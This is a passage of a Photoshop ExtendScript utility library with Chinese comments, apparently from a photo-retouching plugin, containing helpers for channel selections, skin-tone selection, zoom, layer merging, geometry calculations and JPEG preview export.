      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  loadSelectionAdd: function (iName) { //加载通道添加选区
    try {
      if (this.getSelectionBounds()) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putName(cTID('Chnl'), iName);
        desc1.putReference(cTID('null'), ref1);
        var ref2 = new ActionReference();
        ref2.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('T   '), ref2);
        app.executeAction(sTID('add'), desc1, DialogModes.NO);
        return !0;
      } else return this.loadSelection(iName);
    } catch (e) { return !1 }
  },
  loadSelectionSubtract: function (iName, isInvert) { //加载通道减去选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('Chnl'), iName);
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('From'), ref2);
      if (isInvert) desc1.putBoolean(cTID('Invr'), true);
      app.executeAction(sTID('subtract'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  loadSelectionCross: function (iName) { //加载通道交叉选区
    try {
      if (this.getSelectionBounds()) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putName(cTID('Chnl'), iName);
        desc1.putReference(cTID('null'), ref1);
        var ref2 = new ActionReference();
        ref2.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('With'), ref2);
        app.executeAction(sTID('interfaceIconFrameDimmed'), desc1, DialogModes.NO);
        return !0;
      } else return this.loadSelection(iName);
    } catch (e) { return !1 }
  },
  loadSelectionCrossLayer: function (iName) { //加载图层交叉选区
    try {
      if (this.getSelectionBounds()) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Trsp'));
        if (iName) ref1.putName(cTID('Lyr '), iName);
        desc1.putReference(cTID('null'), ref1);
        var ref2 = new ActionReference();
        ref2.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('With'), ref2);
        app.executeAction(sTID('interfaceIconFrameDimmed'), desc1, DialogModes.NO);
        return !0;
      } else return this.makeLayerTrsp(iName);
    } catch (e) { return !1 }
  },
  delSelection: function (iName) { //删除通道选区
    if (typeof (iName) != 'object') iName = [iName];
    for (var i = 0; i < iName.length; i++) {
      try {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putName(cTID('Chnl'), iName[i]);
        desc1.putReference(cTID('null'), ref1);
        app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      } catch (e) { }
    }
  },
  moveSelection: function (iPos) { //移动选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), iPos[0]);
      desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), iPos[1]);
      desc1.putObject(cTID('T   '), cTID('Ofst'), desc2);
      app.executeAction(sTID('move'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  delSelPixels: function (iName) { //删除选区像素
    try {
      if (this.getSelectionBounds()) app.executeAction(sTID('delete'), undefined, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  skinSelection: function (feather) { //皮肤选区
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('Fzns'), feather || 200);
      desc1.putEnumerated(cTID('Clrs'), cTID('Clrs'), sTID("skinTone"));
      desc1.putBoolean(sTID("UseFacesKey"), true);
      desc1.putInteger(sTID("colorModel"), 0);
      app.executeAction(sTID('colorRange'), desc1, DialogModes.NO);
      this.toggleEdges();
      return !0;
    } catch (e) { return !1 }
  },
  skinRange: function (faceData) { //皮肤范围选区
    try {
      if (!this.loadSelection('$XT|Temp|skinRange')) {
        this.autoCutout();
        // this.saveSelection('$XT|Temp|Cutout');
        this.skinSelection();
        try {
          if (faceData.length > 0) { //人脸识别成功
            var doc = app.activeDocument;
            var faceArea = (faceData[0].faceRect.width * faceData[0].faceRect.height) / (doc.width.as("px") * doc.height.as("px"));
          } else var faceArea = 0.05;
          var desc1 = new ActionDescriptor();
          desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), faceArea * 180);
          desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), false);
          app.executeAction(sTID('feather'), desc1, DialogModes.NO);
          this.toggleEdges();
        } catch (e) { }
        // this.loadSelectionCross('$XT|Temp|Cutout');
        // this.delSelection('$XT|Temp|Cutout');
        this.saveSelection('$XT|Temp|skinRange');
      }
      return !0;
    } catch (e) { return !1 }
  },
  toggleEdges: function () { //隐藏/显示选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("Mn  "), cTID("MnIt"), cTID("TglE"));
      desc1.putReference(cTID("null"), ref1);
      app.executeAction(cTID("slct"), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  convertMode: function (colorModeName) { //转换颜色模式
    try {
      var desc1 = new ActionDescriptor();
      desc1.putClass(cTID('T   '), sTID(colorModeName));
      desc1.putBoolean(cTID('Fltt'), false);
      desc1.putBoolean(cTID('Rstr'), false);
      app.executeAction(sTID('convertMode'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  freeZoom: function (zoom) { //自由缩放显示
    // if (zoom < 1) zoom = 1;
    var ref = new ActionReference();
    ref.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
    var getScrRes = executeActionGet(ref).getObjectValue(sTID('unitsPrefs')).getUnitDoubleValue(sTID('newDocPresetScreenResolution')) / 72;
    var docRes = activeDocument.resolution;
    app.activeDocument.resizeImage(undefined, undefined, getScrRes / (zoom / 100), ResampleMethod.NONE);
    var desc = new ActionDescriptor();
    ref = null; ref = new ActionReference();
    ref.putEnumerated(cTID("Mn  "), cTID("MnIt"), cTID('PrnS'));
    desc.putReference(cTID("null"), ref);
    app.executeAction(cTID("slct"), desc, DialogModes.NO);
    app.activeDocument.resizeImage(undefined, undefined, docRes, ResampleMethod.NONE);
  },
  zoomOut: function () { //缩小显示
    // var desc1 = new ActionDescriptor();
    // var ref1 = new ActionReference();
    // ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), sTID('zoomOut'));
    // desc1.putReference(cTID('null'), ref1);
    // app.executeAction(cTID('slct'), desc1, DialogModes.NO);
    try { app.runMenuItem(sTID('zoomOut')) } catch (e) { }
  },
  zoomIn: function () { //放大显示
    // var desc1 = new ActionDescriptor();
    // var ref1 = new ActionReference();
    // ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), cTID('ZmIn'));
    // desc1.putReference(cTID('null'), ref1);
    // app.executeAction(cTID('slct'), desc1, DialogModes.NO);
    try { app.runMenuItem(sTID('zoomIn')) } catch (e) { }
  },
  zoomFit: function () { //满屏显示
    // var desc1 = new ActionDescriptor();
    // var ref1 = new ActionReference();
    // ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), cTID('FtOn'));
    // desc1.putReference(cTID('null'), ref1);
    // app.executeAction(cTID('slct'), desc1, DialogModes.NO);
    try { app.runMenuItem(cTID('FtOn')) } catch (e) { }
  },
  zoomActual: function () { //100%显示
    try {
      app.runMenuItem(cTID('FtOn'));
      app.runMenuItem(cTID('ActP'))
    } catch (e) { }
  },
  zoomValue: function () { //获取缩放比例值
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID("Dcmn"), cTID("Ordn"), cTID("Trgt"));
    var desc1 = app.executeActionGet(ref1);
    return Math.round(Number(desc1.getDouble(sTID("zoom"))) * 10000) / 100;
  },
  resizeWindowsOnZoom: function (isFlag) { //缩放时调整窗口大小
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Prpr'), sTID("toolsPreferences"));
    ref1.putEnumerated(cTID('capp'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putBoolean(cTID('RWOZ'), isFlag);
    desc1.putObject(cTID('T   '), sTID("toolsPreferences"), desc2);
    app.executeAction(cTID('setd'), desc1, DialogModes.NO);
  },
  resizeImage: function (unit, width, height, resolution, resampleMethod) { //图像尺寸
    try {
      app.activeDocument.resizeImage(
        width ? UnitValue(width, unit || "px") : null,
        height ? UnitValue(height, unit || "px") : null,
        resolution ? resolution : null,
        resampleMethod ? resampleMethod : ResampleMethod.AUTOMATIC);
      // var desc1 = new ActionDescriptor();
      // desc1.putUnitDouble(cTID('Wdth'), cTID('#Rlt'), 237.543307086614);
      // desc1.putUnitDouble(cTID('Rslt'), cTID('#Rsl'), resolution||300);
      // desc1.putBoolean(sTID("scaleStyles"), true);
      // desc1.putBoolean(cTID('CnsP'), true);
      // desc1.putEnumerated(cTID('Intr'), cTID('Intp'), sTID("automaticInterpolation"));
      // app.executeAction(sTID('imageSize'), desc1, DialogModes.NO);
    } catch (e) { return !1 }
  },
  getPanelMode: function () { //获取面板颜色模式
    try {
      var ref1 = new ActionReference();
      ref1.putProperty(cTID("Prpr"), sTID("interfacePrefs"));
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1).getObjectValue(sTID("interfacePrefs"));
      var PanelMode = app.typeIDToStringID(desc1.getEnumerationValue(sTID("kuiBrightnessLevel")));
    } catch (e) { };
    switch (PanelMode) {
      case "kPanelBrightnessDarkGray":
        return 33;
        break;
      case "kPanelBrightnessMediumGray":
        return 53;
        break;
      case "kPanelBrightnessLightGray":
        return 127;
        break;
      case "kPanelBrightnessOriginal":
        return 164;
        break;
      default:
        return 52;
    };
  },
  setFullScreen: function (iFlag) { //窗口模式切换
    var screenMode;
    switch (iFlag) {
      case 1: screenMode = "screenModeStandard"; break; //窗口模式
      case 2: screenMode = "screenModeFullScreenWithMenubar"; break; //带菜单全屏模式
      case 3: screenMode = "screenModeFullScreen"; break; //全屏模式
      default: screenMode = iFlag; //指定模式
    }
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID("Mn  "), cTID("MnIt"), sTID(screenMode));
    desc1.putReference(cTID("null"), ref1);
    app.executeAction(cTID("slct"), desc1, DialogModes.NO);
  },
  bindAllTabs: function () { //合并所有选项卡
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID("Mn  "), cTID("MnIt"), sTID("consolidateAllTabs"));
    desc1.putReference(cTID("null"), ref1);
    app.executeAction(cTID("slct"), desc1, DialogModes.NO);
  },
  selectLayerWith: function (iName) { //连续选择某层
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName);
      desc1.putReference(cTID('null'), ref1);
      desc1.putEnumerated(sTID("selectionModifier"), sTID("selectionModifierType"), sTID("addToSelectionContinuous"));
      desc1.putBoolean(cTID('MkVs'), false);
      desc1.putBoolean(sTID("dontRecord"), true);
      app.executeAction(sTID('select'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  hasBackground: function (doc) { //是否有背景层
    doc = doc || app.activeDocument;
    return doc.layers[doc.layers.length - 1].isBackgroundLayer;
  },
  mergeBackground: function () { //合并为背景层
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putIndex(cTID('Lyr '), this.hasBackground() ? 0 : 1);
    desc1.putReference(cTID('null'), ref1);
    desc1.putEnumerated(sTID("selectionModifier"), sTID("selectionModifierType"), sTID("addToSelectionContinuous"));
    desc1.putBoolean(cTID('MkVs'), false);
    desc1.putBoolean(sTID("dontRecord"), true);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
    app.executeAction(cTID('Mrg2'), undefined, DialogModes.NO);
    app.activeDocument.activeLayer.isBackgroundLayer = !0;
  },
  cutNewLayer: function (iName) { //通过剪切的图层
    try {
      app.executeAction(cTID('CtTL'), undefined, DialogModes.NO);
      if (iName) app.activeDocument.activeLayer.name = iName;
    } catch (e) { //如果是图层组
      this.mergeNewLayer(iName);
      if (this.getSelectionBounds()) {
        app.executeAction(cTID('Invs'), undefined, DialogModes.NO);
        app.executeAction(cTID('Dlt '), undefined, DialogModes.NO);
        this.deSelection();
      }
    }
  },
  mergeNewLayer: function (iName) { //盖印新图层
    this.newLayer(iName);
    try {
      var isSurveyLayerSet = this.getLayerVisibleByName(localize($.local.surveyLayerSet));
      if (isSurveyLayerSet) this.setLayerVisibleByName(localize($.local.surveyLayerSet), !1);
      var desc1 = new ActionDescriptor();
      desc1.putBoolean(cTID('Dplc'), true);
      app.executeAction(cTID('MrgV'), desc1, DialogModes.NO);
      // if(app.activeDocument.bitsPerChannel!=BitsPerChannelType.EIGHT)this.convertDepth(8);
      if (iName) app.activeDocument.activeLayer.name = iName;
      if (isSurveyLayerSet) this.setLayerVisibleByName(localize($.local.surveyLayerSet), !0);
    } catch (e) { //如果只有背景层
      this.duplicateLayer(iName)
    }
  },
  mergeLayersNew: function (newName) { //向下合并图层
    try {
      app.executeAction(sTID('mergeLayersNew'), undefined, DialogModes.NO);
      if (newName) app.activeDocument.activeLayer.name = newName;
    } catch (e) { return !1 }
  },
  mergeWith: function (iName, newName) { //连续选择某层合并
    try {
      var layer = app.activeDocument.activeLayer;
      if (iName)
        if (layer.name == iName || !this.selectLayerWith(iName)) return !1;
      app.executeAction(cTID('Mrg2'), undefined, DialogModes.NO);
      layer = app.activeDocument.activeLayer;
      if (newName) layer.name = newName;
      else if (iName) layer.name = iName;
      return !0;
    } catch (e) { return !1 }
  },
  mergeMask: function (iName) { //合并蒙板
    try {
      iName = iName || app.activeDocument.activeLayer.name;
      this.setLayerName(iName + 'mergeMask');
      this.mergeNewLayer(iName);
      this.deleteLayerByName(iName + 'mergeMask');
      return !0
    } catch (e) { return !1 }
  },
  pasteToDoc: function (isSel) { //粘贴
    try {
      app.activeDocument.paste(isSel);
      return !0;
    } catch (e) { return !1 }
  },
  topSurveyLayerSet: function () { //置顶观察图层组
    var layer = this.getLayerByName(localize($.local.surveyLayerSet));
    if (layer) layer.move(app.activeDocument.layers[0], ElementPlacement.PLACEBEFORE)
    this.selectLayerMask();
  },
  layerSetWith: function (iName, tName) { //连续选择某层建组
    if (!tName) tName = iName;
    this.selectLayerWith(iName);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(sTID("layerSection"));
    desc1.putReference(cTID('null'), ref1);
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('From'), ref2);
    desc1.putInteger(sTID("layerSectionStart"), 119);
    desc1.putInteger(sTID("layerSectionEnd"), 120);
    desc1.putString(cTID('Nm  '), tName);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
    app.activeDocument.activeLayer.name = tName;
  },
  selectLayerByID: function (id) { //根据id转到指定层
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putIdentifier(cTID('Lyr '), id);
      desc1.putReference(cTID('null'), ref1);
      desc1.putBoolean(cTID('MkVs'), false);
      app.executeAction(sTID('select'), desc1, DialogModes.NO);
      return !0;
    } catch (e) {
      return !1;
    }
  },
  selectLayerByName: function (iName, selMask) { //根据名称转到指定层
    //iName：图层名称
    //selMask：是否选中蒙板
    try { //尝试转到指定层
      if (selMask) {
        try { //尝试转到指定层
          var desc1 = new ActionDescriptor();
          var ref1 = new ActionReference();
          ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
          ref1.putName(cTID('Lyr '), iName);
          desc1.putReference(cTID('null'), ref1);
          desc1.putBoolean(cTID('MkVs'), false);
          desc1.putBoolean(sTID("dontRecord"), true);
          desc1.putBoolean(sTID("forceNotify"), false);
          app.executeAction(sTID('select'), desc1, DialogModes.NO);
        } catch (e) {
          var desc1 = new ActionDescriptor();
          var ref1 = new ActionReference();
          ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID('RGB'));
          ref1.putName(cTID('Lyr '), iName);
          desc1.putReference(cTID('null'), ref1);
          desc1.putBoolean(cTID('MkVs'), false);
          desc1.putBoolean(sTID("dontRecord"), true);
          desc1.putBoolean(sTID("forceNotify"), false);
          app.executeAction(sTID('select'), desc1, DialogModes.NO);
        }
      } else {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID('RGB'));
        ref1.putName(cTID('Lyr '), iName);
        desc1.putReference(cTID('null'), ref1);
        desc1.putBoolean(cTID('MkVs'), false);
        desc1.putBoolean(sTID("dontRecord"), true);
        desc1.putBoolean(sTID("forceNotify"), false);
        app.executeAction(sTID('select'), desc1, DialogModes.NO);
      }
      return !0;
    } catch (e) {
      return !1;
    }
  },
  selectLayerMask: function (notMask) { //选择图层蒙板
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID(notMask ? 'RGB' : 'mask'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putBoolean(cTID('MkVs'), false);
      app.executeAction(sTID('select'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  getSelectFromMask: function (layerName) { //获取图层蒙板选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
      if (layerName) ref2.putName(cTID('Lyr '), layerName);
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  smoothSelect: function (iVal) { //平滑选区
    try {
      var desc1 = new ActionDescriptor();
      desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), iVal || 80);
      desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), false);
      app.executeAction(sTID('smoothness'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  duplicateLayer: function (iName) { //复制图层并更名
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putInteger(cTID('Vrsn'), 5);
      app.executeAction(cTID('Dplc'), desc1, DialogModes.NO);
      if (iName) app.activeDocument.activeLayer.name = iName;
      return !0
    } catch (e) { return !1 }
  },
  duplicateChannel: function (iName) { //复制通道并更名
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      if (iName) desc1.putString(cTID('Nm  '), iName);
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  setChannelName: function (iName) { //更改通道名
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putString(cTID('Nm  '), iName);
      desc1.putObject(cTID('T   '), cTID('Chnl'), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  delTempChannels: function (iName) { //删除临时通道
    try {
      var channels = app.activeDocument.channels;
      for (var n = channels.length - 1; n > 3; n--) {
        var channel = channels[n];
        if (channel.name.indexOf('$XT|Temp|mask') == 0) continue;
        channel.remove()
      }
      return !0
    } catch (e) { return !1 }
  },
  copyLayerBySelect: function (iName) { //通过拷贝的图层
    try {
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      if (iName) desc2.putString(cTID('Nm  '), iName);
      desc1.putObject(cTID('Nw  '), cTID('Lyr '), desc2);
      desc1.putEnumerated(cTID('Usng'), cTID('ArSl'), cTID('Slct'));
      desc1.putBoolean(cTID('Cpy '), true);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  hasBackground: function (doc) { //是否有背景层
    doc = doc || app.activeDocument;  //默认为当前文档
    return doc.layers[doc.layers.length - 1].isBackgroundLayer;
  },
  calculateColorSimilarity: function (color1, color2) { //计算两种颜色值的相似度
    // 检查是否为有效颜色值hex
    function isValidColor(color) {
      const regex = /^#([0-9A-F]{3}){1,2}$/i;
      return regex.test(color);
    }

    // 如果颜色值不是有效的，直接返回0
    if (!isValidColor(color1) || !isValidColor(color2)) return 0;

    //将16进制颜色转换为rgb格式
    function hexToRgb(hex) {
      const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
      return result ? [
        parseInt(result[1], 16),
        parseInt(result[2], 16),
        parseInt(result[3], 16)
      ] : null;
    }

    // 计算相似度
    const c1 = hexToRgb(color1),
      c2 = hexToRgb(color2);
    return 1 - (Math.abs(c1[0] - c2[0]) + Math.abs(c1[1] - c2[1]) + Math.abs(c1[2] - c2[2])) / (255 * 3);
  },
  getDistance: function (aPos, bPos) { //计算两点之间的距离
    try {
      var a = aPos[0] - bPos[0];
      var b = aPos[1] - bPos[1];
      return Math.sqrt(a * a + b * b);
    } catch (e) { return 99999 }
  },
  middlePoint: function (x1, y1, x2, y2) { //求线段中点
    var x = (x1 + x2) / 2;
    var y = (y1 + y2) / 2;
    return { x: x, y: y };
  },
  getPoint: function (x1, y1, x2, y2, length) { //计算线段固定长度的点坐标
    var L = Math.sqrt((x2 - x1) * (x2 - x1) + (y2 - y1) * (y2 - y1)); // 计算线段长度
    var cos = (x2 - x1) / L; // 计算线段角度cos值
    var sin = (y2 - y1) / L; // 计算线段角度sin值
    var x = x1 + length * cos;
    var y = y1 + length * sin;
    return { x: x, y: y };
  },
  rotatedPoint: function (centerX, centerY, radiusX, radiusY, rotNum, length) { //求旋转角度坐标
    // var radius = isMiddle ? this.middlePoint(centerX,centerY,radiusX,radiusY) : {x:radiusX, y:radiusY};
    var radius = length ? this.getPoint(centerX, centerY, radiusX, radiusY, length) : { x: radiusX, y: radiusY };
    var rotatedX = ((radius.x - centerX) * Math.cos(rotNum * Math.PI / 180) - (radius.y - centerY) * Math.sin(rotNum * Math.PI / 180)) + centerX;
    var rotatedY = ((radius.x - centerX) * Math.sin(rotNum * Math.PI / 180) + (radius.y - centerY) * Math.cos(rotNum * Math.PI / 180)) + centerY;
    return [rotatedX, rotatedY]
  },
  calculateAngle: function (p1, p2) { //求两个点之间的线段与水平线之间的夹角
    var deltaX = p2[0] - p1[0];
    var deltaY = p2[1] - p1[1];
    var angleRad = Math.atan2(deltaY, deltaX);
    var angleDeg = angleRad * (180 / Math.PI);
    return angleDeg;
  },
  isInPolygon: function (checkPoint, pointList) { //判断一个点是否在区域内
    for (var n = 0; n < pointList.length; n++) {
      var points = pointList[n];
      var counter = 0;
      var i, xinters, p1, p2;
      var pointCount = points.length;
      p1 = points[0];
      for (i = 1; i <= pointCount; i++) {
        p2 = points[i % pointCount];
        if (checkPoint[0] > Math.min(p1[0], p2[0]) && checkPoint[0] <= Math.max(p1[0], p2[0])) {
          if (checkPoint[1] <= Math.max(p1[1], p2[1])) {
            if (p1[0] != p2[0]) {
              xinters = ((checkPoint[0] - p1[0]) * (p2[1] - p1[1])) / (p2[0] - p1[0]) + p1[1];
              if (p1[1] == p2[1] || checkPoint[1] <= xinters) counter++;
            }
          }
        }
        p1 = p2;
      }
      if (counter % 2 != 0) return !0;
    }
    return !1;
  },
  isCollide: function (R1, R2, ex) { //判断两个矩形是否相交
    //ex: 扩展倍数
    ex = R1.height * ex || 0;
    var rect1 = {}, rect2 = {};
    rect1.x = R1.x - ex;
    rect1.y = R1.y - ex;
    rect1.width = R1.width + ex;
    rect1.height = R1.height + ex;
    rect2.x = R2.x - ex;
    rect2.y = R2.y - ex;
    rect2.width = R2.width + ex;
    rect2.height = R2.height + ex;
    var half1Width = rect1.width / 2,
      half1Height = rect1.height / 2,
      half2Width = rect2.width / 2,
      half2Height = rect2.height / 2,
      cen1 = {
        x: rect1.x + half1Width,
        y: rect1.y + half1Height
      },
      cen2 = {
        x: rect2.x + half2Width,
        y: rect2.y + half2Height
      };
    return Math.abs(cen2.x - cen1.x) <= half1Width + half2Width && Math.abs(cen2.y - cen1.y) <= half1Height + half2Height;
  },
  getSelectPoint: function () { //获取选区坐标
    try {
      if (!this.getSelectionBounds()) return !1;
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(cTID('Path'));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putProperty(cTID('csel'), sTID("selection"));
      desc1.putReference(cTID('From'), ref2);
      desc1.putUnitDouble(cTID('Tlrn'), cTID('#Pxl'), 2);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      var startRulerUnits = app.preferences.rulerUnits;
      app.preferences.rulerUnits = Units.PIXELS;
      var subPathItems = app.activeDocument.pathItems[0].subPathItems;
      var pointList = [];
      for (var m = 0; m < subPathItems.length; m++) {
        var pathPoints = [];
        for (var n = 0; n < subPathItems[m].pathPoints.length; n++) {
          pathPoints.push(subPathItems[m].pathPoints[n].anchor);
        }
        pointList.push(pathPoints);
      }
      app.preferences.rulerUnits = startRulerUnits;
      this.undo();
      return pointList;
    } catch (e) { return !1 }
  },
  findIndex: function (arr, iVal) { //数组值定位
    try {
      for (var i = 0; i < arr.length; i++) {
        if (arr[i] === iVal) return i;
      }
    } catch (e) { }
    return -1;
  },
  preOriginal: function (longSide, fileName, isSnapshot) { //获取预览原图
    //复制合并为文档
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
    desc1.putReference(cTID('null'), ref1);
    desc1.putString(cTID('Nm  '), "$XT_Thumbnail");
    desc1.putBoolean(cTID('Mrgd'), true);
    app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
    if (this.getDepth() != 8) this.convertDepth(8);
    //缩小为预览图
    if (longSide != 0) {
      longSide = longSide || 1200; //设置长边
      doc = app.activeDocument;
      if (doc.height > doc.width) {
        longSide = Math.min(longSide, doc.height.as('px'));
        doc.resizeImage(null, UnitValue(longSide, "px"), null, ResampleMethod.AUTOMATIC);
      } else {
        longSide = Math.min(longSide, doc.width.as('px'));
        doc.resizeImage(UnitValue(longSide, "px"), null, null, ResampleMethod.AUTOMATIC);
      }
    }
    // var desc1 = new ActionDescriptor();
    // desc1.putUnitDouble(cTID('Hght'), cTID('#Pxl'), 1200);
    // desc1.putUnitDouble(cTID('Rslt'), cTID('#Rsl'), 72);
    // desc1.putBoolean(sTID("scaleStyles"), true);
    // desc1.putBoolean(cTID('CnsP'), true);
    // desc1.putEnumerated(cTID('Intr'), cTID('Intp'), sTID("automaticInterpolation"));
    // app.executeAction(sTID('imageSize'), desc1, DialogModes.NO);
    var res = this.exportPreview(fileName || '$XT_Thumbnail.jpg');
    if (isSnapshot) this.makeSnapshot('$XT|Original|');
    else app.activeDocument.close(SaveOptions.DONOTSAVECHANGES);
    return res;
  },
  exportPreview: function (iName, doc) { //导出预览JPG
    try {
      var docDepth = this.getDepth();
      if (docDepth != 8) this.convertDepth(8);
      this.toSRGB();
      doc = doc || app.activeDocument;
      // doc.changeMode(ChangeMode.RGB);  
      // doc.activeLayer.autoContrast();
      // doc.activeLayer.applySharpen();
      var options = new ExportOptionsSaveForWeb();
      options.quality = 80;
      options.format = SaveDocumentType.JPEG;
      options.optimized = true;
      var newName = File($._Kaibei.tempFolder + iName);
      doc.exportDocument(newName, ExportType.SAVEFORWEB, options);
      if (docDepth != 8) this.convertDepth(docDepth);
      return newName.fsName;
    } catch (e) { return !1 }
  },
  saveWebJpg: function (longSide, fileName, quality) { //导出WEB-JPG
    try {
      var docDepth = this.getDepth();
      app.activeDocument.changeMode(ChangeMode.RGB);
      if (docDepth != 8) this.convertDepth(8);
      var docSize = this.getDocSize();
      var longSideNum = Math.max(docSize.width, docSize.height);
      if (longSide == undefined) longSide = 1200;
      else longSide = longSide ? longSideNum : Math.min(longSide, longSideNum);
      var longScale = 100 * longSide / longSideNum;//缩放百分比
      var outPath = File($._Kaibei.tempFolder + (fileName || '$XT_Thumbnail.jpg'));
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putEnumerated(cTID('Op  '), cTID('SWOp'), cTID('OpSa'));
      desc2.putBoolean(cTID('DIDr'), true);
      desc2.putPath(cTID('In  '), new File(outPath.path));//保存路径
      desc2.putString(cTID('ovFN'), outPath.name);//保存文件名
      desc2.putEnumerated(cTID('Fmt '), cTID('IRFm'), sTID("JPEGFormat"));//格式
      desc2.putBoolean(cTID('Intr'), false);//交错
      desc2.putInteger(cTID('Qlty'), quality || 80);//保存质量：0~100
      desc2.putInteger(cTID('QChS'), 0);
      desc2.putInteger(cTID('QCUI'), 0);
      desc2.putBoolean(cTID('QChT'), false);//品质通道文本图层
      desc2.putBoolean(cTID('QChV'), false);//品质通道矢量图层
      desc2.putBoolean(cTID('Optm'), quality < 100);//优化
      desc2.putInteger(cTID('Pass'), 1);//处理次数
      desc2.putDouble(cTID('blur'), 0);//模糊
      desc2.putBoolean(cTID('Mtt '), false);//杂边
